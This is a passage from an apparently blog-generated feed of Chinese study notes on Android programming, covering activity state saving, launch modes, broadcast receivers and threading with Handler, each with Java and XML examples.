title="活动被回收"></a>活动被回收</h3><p>当活动<code>A</code>调用活动<code>B</code>，活动<code>B</code>返回活动<code>A</code>时，活动<code>A</code>已经被回收，此时会通过<code>onCreate()</code>重新创造活动<code>A</code>，但是此时在活动<code>A</code>的数据会消失，在活动销毁之前会调用<code>onSaveInstanceState()</code>方法。该方法写到<code>Bundle</code>类型的参数，并且听过方法用于保存数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSaveInstanceState</span><span class="hljs-params">(Bundle outState)</span> &#123;<br>    <span class="hljs-built_in">super</span>.onSaveInstanceState(outState);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">tempData</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Something you just typed&quot;</span>;<br>    outState.putString(<span class="hljs-string">&quot;data_key&quot;</span>,tempData);<br>&#125;<br></code></pre></td></tr></table></figure><p>而<code>onCreate()</code>方法存在参数<code>Bundle</code>。</p><h3 id="活动的启动模式"><a href="#活动的启动模式" class="headerlink" title="活动的启动模式"></a>活动的启动模式</h3><p>启动模式有4种，分别是<code>standard</code>、<code>singleTop</code>、<code>singleTask</code>和<code>singleInstance</code>，可以通过<code>android:launchMode</code>属性选择启动模式。</p><ul><li><p><code>standard</code>:就是默认的模式，使用返回栈存储活动，即使调用的活动已经在栈顶，仍然会将该活动当成新的栈顶。此时栈中就会存在两个相同的活动。</p></li><li><p><code>singleTop</code>:会改进<code>standard</code>模式，当调用的活动已经存在栈顶时，不会再调用。但是会出现这种情况当活动<code>A</code>调用活动<code>B</code>，活动<code>B</code>再次调用活动<code>A</code>时，栈的情况<code>A--&gt;B--&gt;A</code>，此时栈上会出现两个活动<code>A</code>的实例。</p></li><li><p><code>singleTask</code>:解决<code>singleTop</code>出现多个相同实例的情况，若发现需要调用的活动，在栈上存在实例则直接取出该实例，而不会另外新增一个该活动的实例。并且把该活动之上的所有实例弹出栈。</p></li><li><p><code>singleInstance</code>:指定了<code>singleInstance</code>模式的活动会启用一个新的返回栈来管理这个活动。此时可以实现其他程序与自己的程序共享一个活动的实例，由于每个程序有自己的一个返回栈，若不采用该启动模式，相同活动在不同的返回栈中存在不同的实例也就不可能共享相同的实例了。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Android编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android第一行代码--广播</title>
    <link href="/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E5%B9%BF%E6%92%AD/"/>
    <url>/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E5%B9%BF%E6%92%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="广播机制"><a href="#广播机制" class="headerlink" title="广播机制"></a>广播机制</h1><p>为了方便进行系统级别的消息通知，<code>Android</code>引用一套广播消息机制。<code>Android</code>中的每个应用程序可以对自己感兴趣的广播进行注册。</p><ul><li>标志广播:是一种完全异步执行的广播，广播发出时，所有广播接收器几乎在同一时刻接收到这条广播信息。</li><li>有序广播:是一种同步执行的广播，在广播发出时，同一时刻只会有一个广播接收器能够收到这条广播信息，当这个广播接收器逻辑执行完毕后，广播才会继续传递。此时的广播具有优先级，优先级高的广播接收器可以先收到广播信息，并且前面的广播接收器还可以截断正在传递的广播。</li></ul><h2 id="接收系统广播"><a href="#接收系统广播" class="headerlink" title="接收系统广播"></a>接收系统广播</h2><ul><li>动态注册：在代码中注册</li><li>静态注册：<code>AndroidManifest.xml</code>注册</li></ul><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>    <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>    setContentView(R.layout.activity_main);<br>    intentFilter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntentFilter</span>();<span class="hljs-comment">//意图过滤器</span><br>    intentFilter.addAction(<span class="hljs-string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span>);<br>    networkChangeReceiver = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkChangeReceiver</span>();<br>    registerReceiver(networkChangeReceiver,intentFilter);<br><br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">super</span>.onDestroy();<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkChangeReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        Log.d(<span class="hljs-string">&quot;onReceive&quot;</span>, <span class="hljs-string">&quot;onReceive: 11111&quot;</span>);<br>        Toast.makeText(context,<span class="hljs-string">&quot;network changes&quot;</span>,Toast.LENGTH_SHORT).show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>IntentFilter</code>:意图拦截器，用于拦截符合<code>action</code>和<code>category</code>的意图，这里需要接收网络修改的广播，因此行为为<code>&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</code></p></li><li><p><code>NetworkChangeReceiver</code>类是继承了广播类并重写了接收到广播的方法</p></li><li><p><code>registerReceiver()</code>方法用于注册广播接收器</p><ul><li>参数一:需要注册的广播接收器</li><li>参数二:需要接收广播的行为</li></ul></li><li><p><code>unregisterReceiver()</code>方法用于取消注册</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>            <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">connectivityManager</span> <span class="hljs-operator">=</span> (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);<br>            <span class="hljs-type">NetworkInfo</span> <span class="hljs-variable">networkInfo</span> <span class="hljs-operator">=</span> connectivityManager.getActiveNetworkInfo();<br>            <span class="hljs-keyword">if</span>(networkInfo != <span class="hljs-literal">null</span> &amp;&amp; networkInfo.isAvailable())<br>            &#123;<br>                Toast.makeText(context,<span class="hljs-string">&quot;network is available&quot;</span>, Toast.LENGTH_SHORT).show();<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                Toast.makeText(context,<span class="hljs-string">&quot;network is unavailable&quot;</span>,Toast.LENGTH_SHORT).show();<br>            &#125;<br><br>        &#125;<br></code></pre></td></tr></table></figure><ul><li><code>getSystemService()</code>方法用于获取系统服务类</li><li><code>ConnectivityManager</code>类是专门用于管理网络连接</li><li><code>getActiveNetworkInfo()</code>方法用于获取网络状态</li></ul><h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><p>动态注册更灵活但是必须程序运行时才能接收广播，但是静态注册可以在程序未启动的时候接收广播。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.BootCompleteReceiver&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>android:name</code>用于指定注册的广播接收器</li><li><code>android:enabled</code>表示是否启用该广播接收器</li><li><code>android:exported</code>表示是否允许这个广播接收器接收本程序以外的广播</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.BootCompleteReceiver&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>由于<code>Android</code>系统启动时会发出值为<code>android.intent.action.BOOT_COMPLETED</code>的广播，因此添加相应的<code>action</code>。</p><h2 id="发送自定义广播"><a href="#发送自定义广播" class="headerlink" title="发送自定义广播"></a>发送自定义广播</h2><h3 id="发送标准广播"><a href="#发送标准广播" class="headerlink" title="发送标准广播"></a>发送标准广播</h3><p>首先自定义一个广播接收器，<code>&lt;intent-filter&gt;</code>标签内需要拦截的行为为<code>&quot;com.example.mybroadcastreceiver.MY_BROADCAST&quot;</code>，接着发送广播的行为也为这个，即可发送和接收广播。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;com.example.mybroadcastreceiver.MY_BROADCAST&quot;</span>);<br>sendBroadcast(intent);<br></code></pre></td></tr></table></figure><h3 id="发送有序广播"><a href="#发送有序广播" class="headerlink" title="发送有序广播"></a>发送有序广播</h3><p>广播可以跨进程通信。</p><ul><li><code>sendOrderedBroadcast(intent,null)</code>方法可以发送有序广播<ul><li>参数一：<code>Intent</code>对象</li><li>参数二：与权限相关的字符串</li></ul></li><li><code>android:prority</code>可以自定义广播的优先级</li><li><code>abortBroadcast()</code>方法可以拦截广播</li></ul><h2 id="本地广播"><a href="#本地广播" class="headerlink" title="本地广播"></a>本地广播</h2><ul><li>本地广播是在程序内部的广播，防止接收垃圾广播，或者广播中携带安全数据被恶意劫持。</li><li>本地广播无法静止注册</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> IntentFilter intentFilter;<br>    <span class="hljs-keyword">private</span> LocalReceiver localReceiver;<br>    <span class="hljs-keyword">private</span> LocalBroadcastManager localBroadcastManager;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        localBroadcastManager =  LocalBroadcastManager.getInstance(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> (Button) findViewById(R.id.button);<br>        button.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>                <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;com.example.mybroadcastreceiver.MY_BROADCAST&quot;</span>);<br>                localBroadcastManager.sendBroadcast(intent);<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.onDestroy();<br>        localBroadcastManager.unregisterReceiver(localReceiver);<br>    &#125;<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span>&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>            Toast.makeText(context,<span class="hljs-string">&quot;received local  broadcast&quot;</span>,Toast.LENGTH_SHORT).show();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本地广播使用动态注册。</p><ul><li><code>LocalBroadcastManager</code>：用于在同一个应用内的不同组件间发送Broadcast</li></ul><h2 id="强制下线功能"><a href="#强制下线功能" class="headerlink" title="强制下线功能"></a>强制下线功能</h2><p><strong>ActivityConllector</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivityCollector</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> List&lt;Activity&gt;activities = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addActivity</span><span class="hljs-params">(Activity activity)</span>&#123;<br>        activities.add(activity);<span class="hljs-comment">//增加活动</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeActivity</span><span class="hljs-params">(Activity activity)</span>&#123;<br>        activities.remove(activity);<span class="hljs-comment">//删除活动</span><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">finishAll</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//移除所有活动</span><br>        <span class="hljs-keyword">for</span>(Activity activity:activities)&#123;<br>            <span class="hljs-keyword">if</span>(!activity.isFinishing())&#123;<br>                activity.finish();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ForceOfflineReceiver类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java">.....<br>    <span class="hljs-comment">//需要在Resume与Pause中重写代码，强制下线的对话框需要在栈顶的活动实例中展现，不需要每个活动实例都弹出对话框。</span><br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onResume</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.onResume();<br>        <span class="hljs-type">IntentFilter</span> <span class="hljs-variable">intentFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntentFilter</span>();<br>        intentFilter.addAction(<span class="hljs-string">&quot;com.example.broadcastbestpractice.FORCE_OFFLINE&quot;</span>);<br>        receiver = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForceOfflineReceiver</span>();<br>        registerReceiver(receiver,intentFilter);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPause</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.onPause();<br>        <span class="hljs-keyword">if</span>(receiver!=<span class="hljs-literal">null</span>)&#123;<br>            unregisterReceiver(receiver);<br>            receiver = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>.....<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForceOfflineReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span>&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Context context, Intent intent)</span> &#123;<br>            AlertDialog.<span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(context);<span class="hljs-comment">//创建一个对话框</span><br>            builder.setTitle(<span class="hljs-string">&quot;Warning&quot;</span>);<span class="hljs-comment">//设置标题</span><br>            builder.setMessage(<span class="hljs-string">&quot;You are forced to be offline. Please try to login agin&quot;</span>);<span class="hljs-comment">//设置消息</span><br>            builder.setCancelable(<span class="hljs-literal">false</span>);<span class="hljs-comment">//取消功能必须删除，否则无法强制下线</span><br>            <span class="hljs-comment">//点击OK会触发的时间</span><br>            builder.setPositiveButton(<span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DialogInterface</span>.OnClickListener() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(DialogInterface dialog, <span class="hljs-type">int</span> which)</span> &#123;<br>                    ActivityCollector.finishAll();<span class="hljs-comment">//将所有活动移除</span><br>                    <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(context,LoginActivity.class);<br>                    context.startActivity(intent);<span class="hljs-comment">//重新跳转到登陆页面</span><br>                &#125;<br>            &#125;);<br>            builder.show();<br>        &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android第一行代码--服务</title>
    <link href="/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E6%9C%8D%E5%8A%A1/"/>
    <url>/2023/06/07/Android%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81--%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><ul><li>服务(Service)用于<code>Android</code>实现程序后台运行。适合不需要与用户交互且长期运行的任务。</li><li>服务并不是运行在独立进程中，而是依赖于创建服务所在的进程中，若该进程被杀死，服务也会停止。</li></ul><h2 id="Android多线程编程"><a href="#Android多线程编程" class="headerlink" title="Android多线程编程"></a>Android多线程编程</h2><h3 id="线程基本用法"><a href="#线程基本用法" class="headerlink" title="线程基本用法"></a>线程基本用法</h3><p><strong>通过类继承</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">//处理具体的逻辑</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//启动</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>().start();<br></code></pre></td></tr></table></figure><p><strong>通过实现接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//处理具体的逻辑</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//启动</span><br><span class="hljs-type">MyThread</span> <span class="hljs-variable">myThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(myThread).start();<br></code></pre></td></tr></table></figure><p><strong>匿名类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>()&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//处理具体的逻辑</span><br>    &#125;<br>&#125;).start();<br></code></pre></td></tr></table></figure><h2 id="子线程中更新UI"><a href="#子线程中更新UI" class="headerlink" title="子线程中更新UI"></a>子线程中更新UI</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>    <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>        <span class="hljs-keyword">case</span> R.id.change_text:<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-comment">//在子线程中对UI进行修改</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                    text.setText(<span class="hljs-string">&quot;Nice to meet ou&quot;</span>);<br>                &#125;<br>            &#125;).start();<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>运行会出现以下报错，这是由于<code>Android</code>系统不允许子线程修改<code>UI</code>界面</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220118171011196.png" alt="image-20220118171011196"></p><p>使用<code>Android</code>提供的异步消息处理机制，就可以实现子线程中进行<code>UI</code>操作。在子线程中只实现了发送消息，而消息处理的过程是在主线程中完成的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">....<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">UPDATE_TEXT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>()&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span>&#123;<span class="hljs-comment">//重写消息处理方法</span><br>            <span class="hljs-keyword">switch</span> (msg.what)&#123;<br>                <span class="hljs-keyword">case</span> UPDATE_TEXT:<br>                    text.setText(<span class="hljs-string">&quot;Nice to meet you&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;;<br>....<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>            <span class="hljs-keyword">case</span> R.id.change_text:<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> 